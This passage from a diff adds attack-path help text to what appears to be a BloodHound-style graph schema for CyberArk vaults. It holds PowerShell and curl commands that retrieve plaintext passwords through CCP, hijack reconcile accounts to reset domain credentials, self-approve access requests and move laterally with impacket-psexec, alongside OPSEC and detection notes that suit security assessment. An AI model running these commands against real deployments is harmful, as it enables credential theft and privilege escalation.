+            "content": "```powershell\nRetrieve the credential directly from the CCP endpoint using the application's AppID. No PVWA token is required — only network access to the CCP server (and, if appIsUnrestricted=false, the request must originate from one of the allowedMachines / run as the permitted OS user / binary):\n\n$ccp = 'https://<CCP_Server>'\n# Exact lookup for a single account (CCP returns at most ONE match per request):\nInvoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n# RegExp query to search/enumerate the vault one match at a time (QueryFormat=regexp):\nInvoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=adm\"\nInvoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=admin;Address=domain1.local\"\n\n# The default CCP application usually has access to ALL safes:\nInvoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=AIMWebService&QueryFormat=regexp&Query=username=domainadmin;Address=domain1.local\"\n\nThe JSON response includes the plaintext 'Content' field (the password) plus account metadata.\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_CCPAllowedFrom",
       "description": "The target Active Directory computer is in the source CyberArk Application's Allowed Machines list — a host permitted to present the AppID to the CCP/AIMWebService endpoint. When machineIsOnlyRestriction is true, control of the host is sufficient to wield the AppID. Inferred by name match; IP-only entries do not resolve to a Computer. Tradecraft: Marat Nigmatullin (FalconForce), SO-CON 2026.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nFrom the allowed host, pull the credential via CCP (the response 'Content' field is the plaintext password):\n\ncurl -s \"https://<CCP_Server>/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n# If a client certificate is also required (machineIsOnlyRestriction=false), supply it with --cert/--key.\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "Issuing the request from an approved host is exactly the intended use of the AppID, so it blends in with legitimate CCP traffic. Retrievals are still recorded under the application identity and CCP usage can be collected centrally. If machineIsOnlyRestriction is false, the Allowed Machines check is only one of several factors and landing on this host alone will not yield credentials."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The target Active Directory computer appears in the source CyberArk Application's Allowed Machines list — it is one of the hosts permitted to present this AppID to the Central Credential Provider (CCP / AIMWebService) endpoint. This is inferred by matching the Allowed Machines value to a computer name; IP-only entries (targetIsIP=true) will not resolve to a Computer node. When machineIsOnlyRestriction=true, the Allowed Machines binding is the AppID's ONLY authentication factor (no OS user / path / hash / certificate), so control of this host is sufficient to wield the AppID and retrieve every credential it can read via CCP. Tradecraft credit: Marat Nigmatullin (@_mnigma_, FalconForce) — \"4 GET requests = 3 Domain admins: CyberArk magic you didn't know about\", SO-CON 2026."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/credential-providers/latest/en/content/ccp/calling-the-web-service-using-rest.htm>\n- <https://docs.cyberark.com/credential-providers/latest/en/content/cp%20and%20ascp/application-details.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nFrom the allowed host, request the credential through the CCP endpoint — the request now originates from a permitted machine, satisfying the Allowed Machines restriction:\n\n$ccp = 'https://<CCP_Server>'\nInvoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n# Then follow the application's CyberArk_CanRetrieveViaCCP edges to see exactly which accounts become reachable from here.\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_CanHijackViaReconcile",
       "description": "The source principal can introduce or control accounts in a safe (addAccounts/manageSafe) whose platform defines the target privileged reconcile account, and can therefore coerce the CPM into using that reconcile account to reset an account of the attacker's choosing. Privilege escalation; the reconcile account's own edges bound the blast radius. Tradecraft: Marat Nigmatullin (FalconForce), SO-CON 2026.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nSame primitive with curl — add an account on the reconcile-enabled platform addressed at the victim, reconcile, then retrieve:\n\n# 1. Create the account\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts\" -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\\n  -d '{\"safeName\":\"<viaSafe>\",\"platformId\":\"<reconcileEnabledPlatform>\",\"userName\":\"<target-account>\",\"address\":\"<target-host-or-domain>\",\"secretType\":\"password\"}'\n\n# 2. Reconcile (uses the privileged reconcile account)\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Reconcile\" -H \"Authorization: Bearer $TOKEN\"\n\n# 3. Retrieve the reset target password\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' -d '{}'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "This is destructive: it RESETS the target account's password, which will break any legitimate use of that account and is highly visible in the target system's logs (e.g. Windows 4724/4738 password-reset events) and in the CyberArk audit trail. Account creation, the reconcile operation, and the password retrieval are all logged under the acting user. Use only in a lab or with explicit change-controlled authorization. The reconcile account is normally used only by the CPM — human-initiated reconciliation against an unexpected target is a strong detection opportunity."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source principal holds account-management permission (addAccounts and/or manageSafe) on the safe named in viaSafe, and that safe contains accounts whose platform defines the target account as its privileged reconcile account. By creating a new account (or redirecting an existing one) on that platform and pointing it at a chosen target system/identity, the principal causes the CPM to use the reconcile account to reset the target's password to a value stored in the Vault — which the principal can then retrieve. The reconcile account is typically a highly privileged credential (e.g. a domain admin), so this is a privilege-escalation edge: its blast radius is whatever the reconcile account is authorized to reset (follow the reconcile account's own CyberArk_SyncsToADUser / CyberArk_CanConnect edges). Tradecraft credit: Marat Nigmatullin (@_mnigma_, FalconForce) — \"4 GET requests = 3 Domain admins: CyberArk magic you didn't know about\", SO-CON 2026."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/defining-reconcile-account.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/rest-api-reconcile-account.htm>\n- <https://github.com/SpecterOps/presentations/tree/main/SO-CON%202026>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nOn a platform that uses the target reconcile account, create an account that points at the victim, then drive CPM reconciliation so the reconcile credential resets the victim's password:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n# 1. Add an account on the reconcile-enabled platform, addressed at the target:\n$body = @{\n    safeName   = '<viaSafe>'\n    platformId = '<reconcileEnabledPlatform>'\n    userName   = '<target-account>'\n    address    = '<target-host-or-domain>'\n    secretType = 'password'\n} | ConvertTo-Json\n$acct = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts\" -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n\n# 2. Trigger reconciliation (the CPM uses the privileged reconcile account to reset the target):\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/$($acct.id)/Reconcile\" -Method POST -Headers $headers\n\n# 3. Retrieve the now-known target password:\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/$($acct.id)/Password/Retrieve\" -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_CanApprove",
       "description": "The source user or group can approve dual-control access requests for accounts in the target safe (requestsAuthorizationLevel1/Level2). Approval authority alone does not grant credential access, so this edge is not traversable.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nList pending incoming access requests:\n\ncurl -s \"https://<pvwa>/PasswordVault/API/IncomingRequests\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n\nApprove a request:\n\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/IncomingRequests/<requestId>/Confirm\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"Reason\":\"Approved\"}'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "All approval actions are recorded in the CyberArk audit trail under the approving user's identity. Self-approval — where the same account submits and approves its own request — may be flagged by security monitoring rules or periodic audit reviews. Mutual approval between two colluding accounts is harder to detect without correlated analysis across request and approval events. Look for accounts that appear in both CyberArk_HasAccessTo (with requiresApproval=true) and CyberArk_CanApprove edges on the same safe."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source principal has dual-control approval authority over access requests for accounts within the target safe. The approvalLevel property specifies the tier: 1 for first-level approval, 2 for second-level approval. A principal with accessWithoutConfirmation permission bypasses the dual-control workflow entirely. This edge enables dual-control bypass attacks: if the same principal also has CyberArk_HasAccessTo on an account in this safe where requiresApproval=true, they can approve their own access requests. Two colluding principals can mutually authorize each other's requests."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/approve-request.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dualcontrolworkflow.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nList pending incoming access requests (as approver):\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n$requests = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/IncomingRequests\" -Headers $headers\n$requests.IncomingRequests | Select-Object RequestId, AccountDetails, Requester\n\nApprove a specific request:\n\n$confirmBody = @{Reason = 'Approved'} | ConvertTo-Json\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/IncomingRequests/<requestId>/Confirm\" `\n    -Method POST -Headers $headers -Body $confirmBody -ContentType 'application/json'\n\nFor accessWithoutConfirmation: no approval step is required — retrieve the credential directly.\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_MemberOf",
       "description": "The source CyberArk user or group is a member of the target CyberArk group, inheriting all of the group's safe permissions and vault authorizations cumulatively.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nEnumerate safes where the group has membership:\n\ncurl -s \"https://<pvwa>/PasswordVault/API/Safes/<safeUrlId>/Members\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "Group membership queries via the REST API are generally not audited in the CyberArk Vault audit trail. Effective permission chains through group membership may not be immediately visible in standard PVWA safe membership reports, which can list the group rather than its individual members."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk user or group is a member of the target CyberArk group. Group membership is cumulative: a user inherits all permissions granted to every group they belong to across all safes. Group edges to safes flow transitively through this membership edge, enabling credential access without direct safe membership."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/managing-vault-groups.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nGroup membership itself does not directly grant credential access — follow the group's outgoing edges (CyberArk_HasAccessTo, CyberArk_CanGrantAccessTo) to identify which accounts and safes are reachable. Enumerate effective group safe memberships:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n# List all safes where this group is a member\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes?search=<safeName>\" -Headers $headers\n# Check group membership in a specific safe\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes/<safeUrlId>/Members\" -Headers $headers\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_InstanceContains",
       "description": "The source CyberArk instance (PVWA/Vault) contains the target top-level configuration object (safe, platform, PSM server, or connection component). Users and groups are excluded to avoid a large edge fan-out in LDAP-synced vaults. Structural environment containment for scoping; not an attack path on its own.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "This relationship is derived from collected structure and generates no audit events by itself. Use it to bound queries to one vault before pivoting into the access and escalation edges (CyberArk_HasAccessTo, CyberArk_CanGrantAccessTo, CyberArk_CanRetrieveViaCCP) that do represent real attack paths."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk instance (PVWA/Vault) contains the target top-level configuration object — a safe, platform, PSM server, or connection component. Users and groups are deliberately excluded from this containment edge to avoid a large edge fan-out in LDAP-synced vaults. This is structural environment containment used for scoping a graph to a single deployment; it is not an attack path on its own."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/the-privileged-access-security-solution.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_Contains",
       "description": "The source CyberArk safe contains the target account. Structural containment that, combined with access or management edges to the safe, maps full credential exposure.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nEnumerate accounts within a safe:\n\ncurl -s \"https://<pvwa>/PasswordVault/API/Accounts?safeName=<safeName>\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "This structural relationship does not generate audit events on its own. Account enumeration within a safe requires the ListAccounts permission and is logged in the Vault audit trail."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk safe contains the target account. This is a structural containment relationship: all safe members with account access permissions (useAccounts or retrieveAccounts) can interact with accounts linked through this edge. Used for graph traversal — CyberArk_HasAccessTo on the safe's parent combined with this edge maps out full credential exposure."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/accounts.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dv-managing-safes.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nThis edge is used for attack path traversal rather than direct exploitation. Enumerate all accounts within a safe to discover reachable credentials:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts?safeName=<safeName>\" -Headers $headers\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_Created",
       "description": "The source CyberArk user created the target safe. Informational: the creator may retain implicit access depending on vault configuration but does not necessarily hold active membership.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nCheck if the creator still has safe membership:\n\ncurl -s \"https://<pvwa>/PasswordVault/API/Safes/<safeUrlId>/Members\" \\\n  -H \"Authorization: Bearer $TOKEN\" | jq '.Members[] | select(.MemberName==\"<creatorName>\")'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "Safe creation is logged in the Vault audit trail. The creator's identity is preserved in the safe's metadata properties. This relationship is informational — actual access capability requires the creator to have an active safe membership."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk user created the target safe. Safe creators are recorded in safe metadata and may retain implicit administrative access depending on vault configuration. In some CyberArk deployments, the creator is automatically added as a safe member with elevated permissions at creation time."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/safes-create.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nVerify whether the creator still has active membership in the safe and what permissions they hold:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes/<safeUrlId>/Members\" -Headers $headers | Select-Object -ExpandProperty Members | Where-Object {$_.MemberName -eq '<creatorName>'}\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_ManagedBy",
       "description": "The target safe is managed by the source CPM (Central Password Manager) user. The CPM service account has privileged programmatic access to all accounts in managed safes for rotation, verification, and reconciliation.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nCPM is primarily a Windows component. However, UNIX CPM (for managing Unix/Linux accounts) may run on Linux:\n\n# Check CPM configuration on Linux deployments\nls /opt/CARKcpm/\ncat /opt/CARKcpm/vault/vault.ini\n\n# Trigger password rotation via REST API:\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Change\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "CPM service account activity is logged under the CPM user identity in the Vault audit trail. Unexpected password rotations or verification failures generate alerts and may be visible in PVWA's account activity view. CPM users are among the most privileged accounts in a CyberArk deployment — their compromise is a critical security event that typically triggers incident response."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The target safe is managed by the source CyberArk CPM (Central Password Manager) user. The CPM service account has privileged programmatic access to all accounts in managed safes: it performs automated password rotation, verification, and reconciliation. Compromising the CPM service account or the CPM server itself grants implicit access to all managed credentials and the ability to disrupt password management operations."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/managing-the-cpm.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pas-installation/install-cpm.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nThe CPM service account credentials are stored in a dedicated CPM safe within the CyberArk Vault. Compromise of the CPM server (typically a Windows Server running CyberArk Password Manager service) may expose credentials through memory or configuration files:\n\n# On the CPM server, the service uses the Vault SDK — look for CyberArk process memory or config files\n# CPM communicates with the Vault on port 1858 (Vault protocol)\n# Configuration: C:\\Program Files (x86)\\CyberArk\\Password Manager\\Vault\\Vault.ini\n# Trigger unauthorized password rotation (disruption):\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Change\" `\n    -Method POST -Headers $headers\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_UsesPlatform",
       "description": "The source account is configured to use the target platform definition. Shared platform configuration means shared policy baseline and attack surface; not a direct access path on its own.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nRetrieve platform configuration:\n\ncurl -s \"https://<pvwa>/PasswordVault/API/Platforms/<platformId>\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n\nList accounts using this platform:\n\ncurl -s \"https://<pvwa>/PasswordVault/API/Accounts?platformId=<platformId>\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "Platform configuration reads are non-invasive and generally not audited. Platform modifications require Vault Administrator or equivalent privileges and are logged. Unexpected platform reassignment of high-value accounts may indicate privilege escalation attempts."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source account is configured to use the target platform definition. The platform governs: password policy (complexity, rotation frequency), connection settings, dual-control requirements, PSM server routing, and Master Policy exception flags. All accounts sharing a platform share the same security policy baseline — a platform-level policy exception affects every account on that platform simultaneously."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-platforms.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/master-policy.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nRetrieve platform configuration to identify policy exceptions that weaken security controls:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n# Get platform details including policy exceptions\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Platforms/<platformId>\" -Headers $headers\n\n# Look for: RequireDualControlPasswordAccessApproval=false (disables dual control)\n# Look for: EnforceCheckinCheckoutExclusiveAccess=false (allows concurrent access)\n# List all accounts on this platform to identify the scope of affected accounts:\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts?platformId=<platformId>\" -Headers $headers\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_UsedAccount",
       "description": "The source CyberArk user has historically accessed the target account, derived from CyberArk audit logs. Forensic/investigative evidence of past use rather than a current access right.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nQuery account activity history:\n\ncurl -s \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Activities\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "This edge is derived from existing audit log data — the historical access events are already recorded. Querying this data does not generate new audit events. Note that a user may have accessed an account historically but no longer have current permissions — always cross-reference with CyberArk_HasAccessTo edges to confirm active access rights."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk user has historically accessed the target account, as recorded in CyberArk audit logs. Unlike CyberArk_HasAccessTo (which shows current permissions), this edge confirms actual historical credential use. The lastUsedTime property indicates the most recent access timestamp, lastActivity indicates the action type (e.g. RetrievePassword, Connect), and usageCount shows the total number of recorded access events within the collection window."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/get-activities.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nThis edge is primarily forensic and investigative rather than directly exploitable. Use it to identify which accounts are operationally active, which users have the broadest credential access history, and which credentials are most likely to be cached or in active use by target users:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n# Query account activity history directly\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Activities\" -Headers $headers\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_LinkedTo",
       "description": "The source account has a credential dependency on the target account (linkType logon, reconcile, or enable). Compromising a logon account grants implicit access to all accounts that depend on it.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nFor linkType=logon — retrieve the logon account credentials and use for lateral movement:\n\n# Retrieve the logon account password\nLOGON_PASS=$(curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<logonAccountId>/Password/Retrieve\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{}' | tr -d '\"')\n\n# Use with Impacket or SSH for lateral movement\nimpacket-psexec '<user>:<password>@<targetSystem>'\nssh <user>@<targetSystem>\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "Logon account chains are frequently overlooked in privilege analysis because they are not obvious from safe membership alone. The logon account for many privileged accounts is itself a highly privileged service account managed by CyberArk. Retrieving a logon account's password is logged in the audit trail; however, the cascading effect on all dependent accounts is not immediately apparent. Monitor for unusual access to logon and reconcile accounts — these are typically only accessed by the CPM service, not by human operators."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source account has a credential dependency on the target account. The linkType property specifies the relationship type: 'logon' (ExtraPass1) means the target account provides the credentials CyberArk uses to connect to the source account's target system (the logon account is used to authenticate to the machine where the source account lives); 'reconcile' (ExtraPass3) means the target account is used to reset the source account's password when rotation fails; any other value is a platform-defined additional account (ExtraPass2, ExtraPass4, …) whose real type name comes from the platform's linkedAccounts metadata — for example a Unix 'JumpAccount' or a Cisco 'EnablePassword' used to elevate during password rotation. The raw slot is preserved in the extraPassID property and the platform's display name in linkTypeDisplayName. Compromising a logon account gives implicit access to all accounts that depend on it, since CyberArk uses the logon account to manage those accounts on the target system."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/configuring-accounts.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/defining-logon-account.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/defining-reconcile-account.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nFor linkType=logon — the logon account's password is used by CyberArk to connect to the target system. Retrieving the logon account's password gives credentials valid on the target system, and since the logon account authenticates to manage all dependent accounts, its credentials provide access to the same systems:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n# Retrieve the logon account password (the target of this edge)\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<logonAccountId>/Password/Retrieve\" `\n    -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'\n\n# Use those credentials for lateral movement to the target system\n$cred = New-Object System.Management.Automation.PSCredential('<user>', (ConvertTo-SecureString '<retrieved-pass>' -AsPlainText -Force))\nInvoke-Command -ComputerName <targetSystem> -Credential $cred -ScriptBlock {whoami}\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_UsesPSMServer",
       "description": "The source platform routes privileged session connections through the target PSM server. Infrastructure mapping showing which PSM server brokers sessions for accounts on the platform.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nPSM for Windows is a Windows-only component. PSM for SSH (PSMP) runs on Linux and handles SSH session brokering:\n\n# PSMP default installation path\nls /opt/CARKpsmp/\n# Session recordings and logs\nls /var/opt/CARKpsmp/logs/\n# PSMP configuration\ncat /etc/opt/CARKpsmp/basic_psmpserver.conf\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "PSM servers are high-value targets and typically have enhanced security controls and monitoring. All privileged sessions passing through PSM are logged with full session metadata. The PSM server itself is typically hardened and managed by CyberArk — direct access to PSM servers is usually restricted to infrastructure administrators."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source platform routes all privileged session connections through the target PSM (Privileged Session Manager) server. Every account using this platform has its sessions isolated, brokered, and recorded by this PSM server. The PSM server acts as a proxy between the requesting user and the target system — users connect to the PSM server, which then connects to the target using the managed credential."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-psm-for-windows.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/psm-manage-recordings.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nCompromising the PSM server exposes all sessions it processes — including live in-flight sessions and stored session recordings. The PSM server runs on Windows Server with CyberArk PSM components:\n\n# PSM stores session recordings locally before transferring to the Session Recording vault\n# Default recording path: C:\\ProgramData\\CyberArk\\PSM\\Sessions\\\n# Recordings are in CyberArk proprietary format — playable via PVWA Recordings viewer\n# PSM server also caches connection parameters that may contain target system details\n# Lateral movement to PSM server may be possible via its Windows Attack Surface (RDP, WinRM, etc.)\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_ManagedByPSM",
